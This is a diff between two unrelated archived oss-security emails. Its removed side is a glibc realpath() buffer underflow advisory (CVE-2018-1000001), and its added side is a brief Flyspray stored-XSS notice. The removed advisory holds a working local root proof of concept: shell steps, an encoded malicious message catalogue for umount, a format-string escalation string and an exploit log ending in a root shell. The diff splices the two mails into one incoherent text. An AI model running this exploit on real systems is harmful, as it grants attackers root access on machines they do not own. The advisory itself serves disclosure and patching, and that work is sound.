@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["22079" "Thursday" "11" "January" "2018" "21:34:44" "+0000" "halfdog" "me@halfdog.net" "<1087-1515706484.393621@m4-w.D8Te.szjC>" "494" "[oss-security] Libc Realpath Buffer Underflow CVE-2018-1000001" "^Date:" nil nil "1" "2018011121:34:44" "[oss-security] Libc Realpath Buffer Underflow CVE-2018-1000001" (number mark "        me@halfdog.n Jan 11  494/22079 " thread-indent "\"[oss-security] Libc Realpath Buffer Underflow CVE-2018-1000001\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2460" "Saturday" "7" "October" "2017" "08:56:48" "+0200" "chbi@chbi.eu" "chbi@chbi.eu" "<4e04d782-268e-46bf-f74e-06696f5bdc7a@chbi.eu>" "77" "[oss-security] Stored XSS vulnerabilities in Flyspray" nil nil nil "10" "2017100706:56:48" "[oss-security] Stored XSS vulnerabilities in Flyspray" (number mark "U       chbi@chbi.eu Oct  7   77/2460  " thread-indent "\"[oss-security] Stored XSS vulnerabilities in Flyspray\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 24001 invoked by uid 550); 11 Jan 2018 21:35:21 -0000
+Received: (qmail 3378 invoked by uid 550); 7 Oct 2017 08:42:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,508 +11,94 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 23940 invoked from network); 11 Jan 2018 21:35:20 -0000
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
-Message-ID: <1087-1515706484.393621@m4-w.D8Te.szjC>
-Date: Thu, 11 Jan 2018 21:34:44 +0000
-From: halfdog <me@halfdog.net>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Libc Realpath Buffer Underflow CVE-2018-1000001
+Received: (qmail 24304 invoked from network); 7 Oct 2017 06:57:08 -0000
 To: oss-security@lists.openwall.com
+From: chbi@chbi.eu
+Message-ID: <4e04d782-268e-46bf-f74e-06696f5bdc7a@chbi.eu>
+Date: Sat, 7 Oct 2017 08:56:48 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.3.0
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha512;
+ protocol="application/pgp-signature";
+ boundary="L3PO4qOppxHD3jgckNkAg5HLfbgKtVkTv"
+Subject: [oss-security] Stored XSS vulnerabilities in Flyspray
 
-Hello list,
-
-This issue is already overdue. Here is a copy of [0] for the archives.
-
-hd=20
-
-[0] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
-
-
-
-<-- Created by SecurityReportToText.xsl V20171225 -->
-
-Libc Realpath Buffer Underflow
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D
-
-=3D=3D=3D Introduction =3D=3D=3D
-
-The vulnerability described here is caused by Linux kernel
-behaviour change in the syscall API (returning relative pathnames
-in getcwd()) and non-defensive function implementation in libc
-(failing to process that pathname correctly). Other libraries
-are very likely to be affected as well. On affected systems this
-vulnerability can be used to gain root privileges via SUID binaries.
-
-The return value specification change in getcwd() was introduced
-in Linux kernel Linux 2.6.36. It has already caused troubles,
-even in realpath(), but at different location (see "bug report" [idm22])
-and was not identified as security issue.
-
-=3D Linux kernel side: =3D: One of the weaknesses of Linux kernel is,
-that it is not fully POSIX compliant (see "Wikipedia POSIX" [idm25]). To
-allow programmers to produce clean and secure code, meticulous
-documentation would be needed, especially to write cross-platform
-software. Changes in specification and documentation after software
-was already written always pose an extra risk. This is also true
-for commit "vfs: show unreachable paths in getcwd and proc" [idm26]
-changing the behaviour of getcwd(). The new specification made
-it finally to the manpages (see "getcwd(2)" [idm27]), but at that
-time glibc was already written. From the somehow contradictory man page:
-
-/These functions return a null-terminated string containing
-an _absolute_ pathname that is the current working directory of
-the calling process. The pathname is returned as the function
-result and via the argument buf, if present./
-
-/If the current directory is not below the root directory of
-the current process (e.g., because the process set a new filesystem
-root using chroot(2) without changing its current directory into
-the new root), then, since Linux 2.6.36, the returned path will
-be prefixed with the string "(unreachable)". Such behavior can
-also be caused by an unprivileged user by changing the current
-directory into another mount namespace. When dealing with paths
-from untrusted sources, callers of these functions should consider
-checking whether the returned path starts with '/' or '(' to avoid
-misinterpreting an unreachable path as a relative path..../
-
-/...getcwd() conforms to POSIX.1-2001. Note however that
-POSIX.1-2001 leaves the behavior of getcwd() unspecified if buf
-is NULL./
-
-The documentation is accurate regarding use of /(unreachable)/
-but most likely not according POSIX compliance. At least POSIX 2004
-and 2008 are violated, 2001 version of standard seems not available
-for free. According to "IEEE Std 1003.1-2008" [idm36] specification of
-getcwd():
-
-/The getcwd() function shall place an absolute pathname of the
-current working directory in the array pointed to by buf, and
-return buf. The pathname shall contain no components that are
-dot or dot-dot, or are symbolic links./
-
-As it seems, that consequences from the change of interface
-specification on Linux kernel side only were not recognized
-by all affected parties. The realpath() function, which relies
-on using getcwd() to resolve relative path names still required
-the old behaviour. Also the manpage does not reflect the changes
-in underlying getcwd() call, see "realpath(3)" [idm40].
-
-=3D Libc side: =3D: glibc still assumes that kernel getcwd()
-would return absolute pathnames and relies on that behaviour when
-realpath() attempts to create a canonicalized absolute pathname:
-/realpath() expands all symbolic links and resolves references
-to /./, /../ and extra '/' characters in the null-terminated string
-named by path to produce a canonicalized absolute pathname.../
-When resolving a relative symbolic link, e.g. /../../x/,
-realpath() will use the current working directory, assuming it
-will start with a /. The function starts at the end of the getcwd
-pathname to jump forward from slash to slash for each /..//
-found in the symbolic link to resolve. It does not check the boundaries
-of the buffer, thus may end up at a slash before the string buffer
-used to create the canonicalized absolute pathname. So resolving
-the link named above with getcwd() returning /(unreachable)//,
-the second /..// will have moved the pointer before the buffer,
-the next part /x/ is then copied to this memory location.
-As realpath usually operates on heap buffers.
-
-
-=3D=3D=3D Methods =3D=3D=3D
-
-This section describes how to improve a simple demonstrator
-to a complex, ASLR-aware high-reliable exploit. The steps used
-might not be the most elegant way to do so. Any hints for improvement
-are appreciated.
-
-To exploit the underflow for privilege escalation, the /mount,
-unmount/ SUID binaries are most suitable targets: they process
-pathes using realpath(), do not drop privileges and can be invoked
-by any user. /umount/ was selected as candidate as it allows
-to process more than one mountpoint per run, thus traversing the
-problematic code more than once. This seemed to be the best way
-to allow user controlled gradual memory editing, defeat of ASLR
-measures and finally quite reliable code execution.
-
-As /umount/ realpath() operates on heap, the first step
-was to create a reproducible heap layout. This was done be removing
-all interfering environment variables and just working with those
-related to locale support. As locales are initialized before umount
-option parsing, this editing affectes the heap structure and content
-lower addresses than the buffer used in the fatal realpath() call.
-Therefore the current exploit relies on the availability of a
-single locale, but /libc-bin/ on standard systems provides
-one: //usr/lib/locale/C.UTF-8/.  It is loaded by using the
-environment variable /LC_ALL=3DC.UTF-8/.
-
-After locale setup, the realpath buffer underflow will overwrite
-a slash in a locale string, used for loading of national language
-support (NLS) files, thus changing it to a relative pathname.
-Thus user controlled translations of umount error messages are
-loaded, giving write access to some memory adresses using the
-%n format feature of /fprintf/ to modify memory. As the stack
-layout used by fprintf is fixed, any address references will work
-without considering ASLR. Luckily, one of those references points
-to the /struct libmnt_context/ defined in /libmount/src/mountP.h/
-from util-linux:
-
-************************************************************
-struct libmnt_context
-{
-        int     action;         /* MNT_ACT_{MOUNT,UMOUNT} */
-        int     restricted;     /* root or not? */
-
-        char    *fstype_pattern;        /* for mnt_match_fstype() */
-        char    *optstr_pattern;        /* for mnt_match_options() */
-...
-************************************************************
-
-
-As the /restricted/ field is within reach, overwriting
-it will make umount believe, that it was started by root, even
-when it was not. This can be used for a quite simple DoS by unmounting
-the root filesystem, which will cause very funny side effects
-on running programs, e.g. aborts, SEGV, .... Follwing commands
-demonstrate the behaviour on fully patched Debian Stretch amd64
-with libc6 2.24-11+deb9u1 and umount from package mount 2.29.2-1.
-Keep in mind, that this simplified POC operates on the umount
-process memory, thus will need adoption to other software versions:
-
-************************************************************
-# Enable USERNS clone as root for demonstration:
-root$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone
-# As normal user create a new namespace:
-test$ /usr/bin/unshare -m -U --map-root-user /bin/sh
-# Caveat: following steps are performed as USERNS-root, not real
-# root user.
-root$ mount -t tmpfs tmpfs /tmp
-root$ cd /tmp
-root$ chmod 00755 .
-root$ mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/from_archive/C/LC_=
-MESSAGES" "(unreachable)/x"
-root$ ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAA=
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
-# Make mount unrestricted by overwriting struct libmnt_context, thus
-# affecting mnt_context_is_restricted in "libmount/src/context.c".
-root$ base64 -d <<B64-EOF | bzip2 -cd > "(unreachable)/tmp/from_archive/C/L=
-C_MESSAGES/util-linux.mo"
-QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG
-mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv
-iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL
-5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=3D
-B64-EOF
-root$ echo "$$"
-2299
-# Now continue in another shell using the USERNS pid from before:
-test$ /proc/2299/cwd
-test$ LC_ALL=3DC.UTF-8 /bin/umount --lazy down /
-umount: AAlnAAAAAAAAAAA
-************************************************************
-
-The simplified single-stage POC from above has multiple drawbacks:
-it can only reliable toggle the permissions bit, thus allowing
-unmounting / causing DoS, but not arbitrary code execution. For
-that, ASLR has to be defeated first. This can be done by following
-sequence of events:
-
-* Start umount with large number of environment variables that
-containing "AANGUAGE=3DX.X", that are just one letter off from correct
-language settings. The large number of environment variables "sprays"
-the upper stack area with a long list of valid pointers.
-* Let umount call realpath() and underflow. When the error message
-is printed, a first-stage message catalogue file is loaded and
-the format string dumps the whole stack to stderr, remove the
-"restricted" bit similar to simplified POC and write a 'L' to
-the sprayed stack, modifying one entry to "LANGUAGE=3DX.X".
-
-* Due to change of language, umount will attemt to load another
-language catalogue. As the exploit prepared a pipe with that name,
-umount will block here giving the exploit the chance to synchronize,
-create an updated message catalogue and let umount continue.
-
-* The updated format strings now contain all offsets for the
-currently running binary. But the stack does not contain suitable
-pointers for writing and fprintf ignores changes of argument pointers
-while running because secure printf copies the values down the
-stack, where we cannot use them directly. Hence fprintf must be
-invoked more than once with the same (unmodified) format string,
-but still has to behave different on each invocation to overwrite
-different memory locations. This is done using the format string
-itself for arithmetics, each fprintf invocation as clock and the
-length of path-name input as instruction pointer, thus creating
-a simplified virtual machine.
-
-* The repeated format string processing changes the return pointer
-from main function to two other functions: getdate() and execl().
-Those functions were choosen for ROP because a single call to
-system() would not work on Ubuntu. This is due to /bin/sh having
-a patch missing in Debian, that will reset the effective UID when
-not matching the the current UID. But as exec calls require a
-more complex stack/register configuration, let getdate() do the
-work for us. For escalation using umount, calling execve in the
-end should work also on SELinux/AppArmor hardened systems. Umount
-needs to call file system helpers during normal operation also.
-On other systems, execl() could be replaced by dlopen(), to inject
-code into running process.
-
-* The invoked program file contains a shebang to make the operating
-system invoke the exploit program as interpreter. The exploit
-then changes his own file ownership and mode to become a root
-SUID binary and terminates. Starting the shell here immediately
-would be possible, but the mount process has a strange set of
-environment variables, which is not so convenient for further
-shell use. Apart from that, by terminating the caller can detect
-successful escalation, perform all cleanup.
-
-* When the initial caller of mount notices the mode change of
-the file, it performs the cleanup and invokes the SUID binary
-to use its secondary function - a SUID shell, thus completing
-the escalation.
-
-All those steps are currently implemented in "RationalLove.c" [idm81]
-apart for the code to create the namespace. Therefore the pid
-of a suitable namespace process has to be hardcoded before compiling.
-Here is the output of exploit invocation:
-
-************************************************************
-
-test@test$ ./RationalLove
-./RationalLove: setting up environment ...
-./RationalLove: using umount at "/bin/umount".
-Attempting to gain root, try 1 of 10 ...
-Starting subprocess
-Stack content received, calculating next phase
-Found source address location 0x7fffb6505d18 pointing to target address 0x7=
-fffb6505de8 with value 0x7fffb650723f, libc offset is 0x7fffb6505d08
-Changing return address from 0x7f9617db62b1 to 0x7f9617e41c30, 0x7f9617e4e9=
-00
-Using escalation string %67$hn%71$hn%1$6116.6116s%65$hn%69$hn%1$1100.1100s%=
-64$hn%1$25446.25446s%66$hn%70$hn%1$26986.26986s%68$hn%1$5888.5888s%1$23798.=
-23798s%1$s%1$s%63$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx=
--%62$lx-%63$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s
-Executable now root-owned
-Cleanup completed, re-invoking binary
-/proc/self/exe: invoked as SUID, invoking shell ...
-root@test# id
-uid=3D0(root) gid=3D0(root) groups=3D0(root),100(users)
-************************************************************
-
-ASLR could also be circumvented using a but in mount environment
-variable handling, see "util-linux mount/unmount ASLR bypass
-via environment variable" [idm84].
-
-
-=3D=3D=3D Results, Discussion =3D=3D=3D
-
-As for example, misbehaviour can be triggered when performing
-a /getcwd/ call in a directory not visible in the current
-mount namespace of the process. See "mount_namespaces man page" [idm89]
-for more information. Therefore a process has to reach such a
-directory within another namespace. There should be various ways
-to do that, e.g. using the /proc/ filesystem to enter the
-working directory of another process (method used in exploit),
-by passing file descriptors via /SCM_RIGHTS/ between cooperating
-processes in different namespaces. Therefore this vulnerability
-shows again the importance of system hardening by disabling USERNS
-when not needed.
-
-On a system with unprivileged USERNS enabled, an attacker can
-create all required namespaces. On other systems, it might be
-possible to use namespaces created by other processes using the
-/proc/ access approach. These can be discovered using
-/readlink /proc/*/ns/mnt | sort -u/. While /systemd-udevd/
-just uses a namespace in a way required for exploitation, the
-//proc/[pid]/cwd/ link cannot accessed by unprivileged users.
-
-Still /systemd-udevd/ is a good example, how hardening of
-a single application by namespaces might also create additional
-attack surface, not only in the application itself. Hence the
-attack method described here may also be appropriate to attack
-other applications using the same hardening measures, e.g. lxc
-or docker.
-
-=3D Affected systems: =3D: Platforms where _Linux kernel_ getcwd()
-prepends non-path components, e.g. to indicate unreachable
-pathes. Such code can be found in /fs/dcache.c/:
-
-************************************************************
-static int prepend_unreachable(char **buffer, int *buflen)
-{
-        return prepend(buffer, buflen, "(unreachable)", 13);
-}
-************************************************************
-
-Most likely this code was created in analogy to the /(deleted)/
-suffix to indicate file handles to deleted files, e.g.:
-
-************************************************************
-test$ touch /tmp/x
-test$ exec 3</tmp/x
-test$ rm /tmp/x
-test$ readlink /proc/self/fd/3
-/tmp/x (deleted)
-************************************************************
-
-_Userspace:_ Currently only libc is proven to misbehave
-when Linux getcwd() returns a relative path. But other libraries
-or tools might also fail in unexpected ways due to that bug.
-
-_glibc:_ Here the underflow occurs in /__realpath/ from
-/stdlib/canonicalize.c/:
-
-************************************************************
-     42 char *
-     43 __realpath (const char *name, char *resolved)
-     44 {
-...
-# When resolving a relative pathname, getcwd() is called:
-     86   if (name[0] !=3D '/')
-     87     {
-     88       if (!__getcwd (rpath, path_max))
-     89         {
-     90           rpath[0] =3D '\0';
-     91           goto error;
-     92         }
-     93       dest =3D __rawmemchr (rpath, '\0');
-     94     }
-     95   else
-...
-# Loop over all name components:
-    101   for (start =3D end =3D name; *start; start =3D end)
-    102     {
-...
-# If the name component is "..", remove it. This underflows the
-# buffer if rpath does not contain a starting slash.
-    118       else if (end - start =3D=3D 2 && start[0] =3D=3D '.' && start=
-[1] =3D=3D '.')
-    119         {
-    120           /* Back up to previous component, ignore if at root alrea=
-dy.          */
-    121           if (dest > rpath + 1)
-    122             while ((--dest)[-1] !=3D '/');
-    123         }
-    124       else
-# The name component is not ".", "..", so copy the name to dest.
-    125         {
-    126           size_t new_size;
-    127
-    128           if (dest[-1] !=3D '/')
-    129             *dest++ =3D '/';
-...
-************************************************************
-
-
-Therefore a simple patch could be "glibc-fail-on-unreachable-v1.patch" [idm=
-114] (nearly UNTESTED,
-older version "v0" [idm115]):
-
-************************************************************
---- stdlib/canonicalize.c	2018-01-05 07:28:38.000000000 +0000
-+++ stdlib/canonicalize.c	2018-01-05 14:06:22.000000000 +0000
-@@ -91,6 +91,11 @@
- 	  goto error;
- 	}
-       dest =3D __rawmemchr (rpath, '\0');
-+/* If path is empty, kernel failed in some ugly way. Realpath
-+has no error code for that, so die here. Otherwise search later
-+on would cause an underrun when getcwd() returns an empty string.
-+Thanks Willy Tarreau for pointing that out. */
-+      assert (dest !=3D rpath);
-     }
-   else
-     {
-@@ -118,8 +123,17 @@
-       else if (end - start =3D=3D 2 && start[0] =3D=3D '.' && start[1] =3D=
-=3D '.')
- 	{
- 	  /* Back up to previous component, ignore if at root already.  */
--	  if (dest > rpath + 1)
--	    while ((--dest)[-1] !=3D '/');
-+	  dest--;
-+	  while ((dest !=3D rpath) && (*--dest !=3D '/'));
-+	  if ((dest =3D=3D rpath) && (*dest !=3D '/') {
-+	    /* Return EACCES to stay compliant to current documentation:
-+	    "Read or search permission was denied for a component of the
-+	    path prefix." Unreachable root directories should not be
-+	    accessed, see https://www.halfdog.net/Security/2017/LibcRealpathBuffe=
-rUnderflow/ */
-+	    __set_errno (EACCES);
-+	    goto error;
-+	  }
-+	  dest++;
- 	}
-       else
- 	{
-************************************************************
-
-=3D Outlook: =3D: It might be worth analyzing how ftp server
-implementation, webservers will react in such context. In some
-cases, this may require combination with application specific
-bugs or unexpected behaviour, e.g. "ApacheNoFollowSymlinkTimerace" [idm119].
-
-
-=3D=3D=3D Timeline =3D=3D=3D
-
-* 20171231: Reported to distros list as glibc errors should
-be reported to distros first.
-* 20180101: Info distros: kernel issue should be handled first.
-Reported to kernel security.
-* 20180102: Kernel security reply: getcwd() behaviour documented
-in "getcwd() 3" man pages, not an issue. Only libraries need fixing.
-* 20180107: Final high-reliability anti-ASLR exploit for Stretch/Xenial usi=
-ng getdate/execl
-* 20180110: CVE "CVE-2018-1000001" [idm128] assigned.
-* 20180111: Publication without exploit code.
-
-
-=3D=3D=3D Material, References =3D=3D=3D
-
-
-
-* Linux POSIX compliance: "Wikipedia" [idm134]
-* POSIX IEEE Std 1003.1-2008: "getcwd" [idm136]
-* Linux mount namespaces: "man page" [idm138]
-* Commit effecting getcwd() in Linux kernel: "vfs: show unreachable paths i=
-n getcwd and proc" [idm140]
-* realpath() with namespaces lstat issue: "18203" [idm142]
-* mount/umount small anti-ASLR bug: "util-linux mount/unmount ASLR bypass v=
-ia environment variable" [idm144]
-* Redhat bug report: "1530306" [idm146]
-* SUSE bug report: "1074293" [idm148]
-
->>> Last modified 20180111
-Contact e-mail: me (%) halfdog.net <<<
-
-* [idm22] https://sourceware.org/bugzilla/show_bug.cgi?id=3D18203
-* [idm25] https://en.wikipedia.org/wiki/POSIX#Mostly_POSIX-compliant
-* [idm26] https://github.com/torvalds/linux/commit/8df9d1a4142311c084ffeeac=
-b67cd34d190eff74
-* [idm27] http://man7.org/linux/man-pages/man2/getcwd.2.html
-* [idm36] http://pubs.opengroup.org/onlinepubs/9699919799/functions/getcwd.=
-html
-* [idm40] http://man7.org/linux/man-pages/man3/realpath.3.html
-* [idm81] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow=
-/RationalLove.c
-* [idm84] https://www.spinics.net/lists/util-linux-ng/msg14978.html
-* [idm89] http://man7.org/linux/man-pages/man7/mount_namespaces.7.html
-* [idm114] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflo=
-w/glibc-fail-on-unreachable-v1.patch
-* [idm115] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflo=
-w/glibc-fail-on-unreachable-v0.patch
-* [idm119] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflo=
-w/../../2011/ApacheNoFollowSymlinkTimerace/
-* [idm128] https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-1000001
-* [idm134] https://en.wikipedia.org/wiki/POSIX#Mostly_POSIX-compliant
-* [idm136] http://pubs.opengroup.org/onlinepubs/9699919799/functions/getcwd=
-.html
-* [idm138] http://man7.org/linux/man-pages/man7/mount_namespaces.7.html
-* [idm140] https://github.com/torvalds/linux/commit/8df9d1a4142311c084ffeea=
-cb67cd34d190eff74
-* [idm142] https://sourceware.org/bugzilla/show_bug.cgi?id=3D18203
-* [idm144] https://www.spinics.net/lists/util-linux-ng/msg14978.html
-* [idm146] https://bugzilla.redhat.com/show_bug.cgi?id=3D1530306
-* [idm148] https://bugzilla.suse.com/show_bug.cgi?id=3D1074293
+--L3PO4qOppxHD3jgckNkAg5HLfbgKtVkTv
+Content-Type: multipart/mixed; boundary="5CllbLbSsu5MC6tgRcribNjpLCgc7KGBo";
+ protected-headers="v1"
+From: chbi@chbi.eu
+To: oss-security@lists.openwall.com
+Message-ID: <4e04d782-268e-46bf-f74e-06696f5bdc7a@chbi.eu>
+Subject: Stored XSS vulnerabilities in Flyspray
 
+--5CllbLbSsu5MC6tgRcribNjpLCgc7KGBo
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: quoted-printable
 
+Hi,
+
+I've discovered two security issues in Flyspray (http://www.flyspray.org/)
+
+
+A stored XSS vulnerability in Flyspray before 1.0-rc6 allows an
+authenticated user to inject JavaScript to gain administrator privileges.
+
+Fix:
+https://github.com/Flyspray/flyspray/commit/754ec5d04348ef7ecb8cb02ade976dc=
+412b031f8
+
+
+A stored XSS vulnerability in Flyspray between 1.0-rc4 and 1.0-rc6
+allows an authenticated user to inject JavaScript to gain administrator
+privileges and also to execute JavaScript against other users (including
+unauthenticated users).
+
+Fix
+https://github.com/Flyspray/flyspray/commit/00cfae5661124f9d67ac6733db61b2b=
+fee34dccc
+
+
+Both issues are fixed in Flyspray 1.0-rc6.
+
+https://github.com/Flyspray/flyspray/releases/tag/v1.0-rc6
+
+
+I've requested CVE IDs (MITRE).
+
+
+--=20
+chbi
+https://chbi.eu
+
+GPG: 3DE9 9187 4BE9 EAE6 3CA8  DC20 BA7B 93F9 9037 AE7E
+     https://chbi.eu/chbi.asc
+
+
+--5CllbLbSsu5MC6tgRcribNjpLCgc7KGBo--
+
+--L3PO4qOppxHD3jgckNkAg5HLfbgKtVkTv
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCgAdFiEEPemRh0vp6uY8qNwgunuT+ZA3rn4FAlnYerYACgkQunuT+ZA3
+rn7ZpA/+JJVMYAKSSd4XgSGAGMb/Ni04ur58lZFLMvZXMpONnsaje+CfPnhcu20c
+Kxm+sTPfwmPnpA1B5BV976IXNhAGIM5jVq2xkIYG+3RJw2TTXHsxvdVqN7QETqrg
+B58vdOpTgFc9GSZ9nC1VxYZUuciudrxevPSIW61qB+8x+FQB7wl9hwaVedzBjyns
+4oa5g3eF1G3Bwk/khSrGbRLivrmBdWle8c/ZqBdy/BnLvnyUgadIt9PjXrlPaRE+
+A1eepNJtwaPdE4AkiwhriIsqsSCTq2gVB36JWXt4GD9qWNq1ZYIeGS/MLQRC64tg
+AArupZAJ5wQBa492cxYpTRGB3ZodNAibhKcKrCJ3Clk+Yg8Oz7FxAHSHw7BtI5X8
+Cnv6p5xBHkZDC2oha/lalgoCxyVyG0zxmJ+BkTCjt5hb/VCVUn1GQfjRJJ+QJNcY
+iEjCBlt8xRM+NJyyXYtjthf5Jyy8K4Q7i1ACDgpUy52LHT5wVlpkI2QNCI1OZQQg
+cK0m0RBBO1sB7D4//QHo0hh+LJiGv4uwLLunQmR3IqKB4DlspV4Bx8yKzb9ZBR/u
+wK1BuqPyVx2fuM9lo/8TYccvjq3CBYJwYzHCSqx0/JOACB/aXbpjqJyvHI+LpXlX
+OSQK1xrrhztNPzT4PXdEAAL2aFLouQNJ1IYoXux7Alr/StTxxxo=
+=kczA
+-----END PGP SIGNATURE-----
+
+--L3PO4qOppxHD3jgckNkAg5HLfbgKtVkTv--
